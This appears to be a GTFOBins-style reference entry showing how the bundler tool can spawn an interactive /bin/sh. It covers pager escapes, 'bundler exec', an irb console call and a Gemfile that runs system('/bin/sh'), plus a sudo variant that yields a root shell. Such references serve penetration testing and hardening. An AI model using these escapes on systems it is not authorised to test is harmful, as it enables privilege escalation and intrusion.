# GTFOBin: bundler

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

This invokes the default pager, which is likely to be  `less`, other functions may apply.

```
bundler help
!/bin/sh
```

```
export BUNDLE_GEMFILE=x
bundler exec /bin/sh
```

```
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundler exec /bin/sh
```

This spawns an interactive shell via `irb`.

```
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')
```

```
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/Gemfile
cd $TF
bundler install
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This invokes the default pager, which is likely to be  `less`, other functions may apply.

```
sudo bundler help
!/bin/sh
```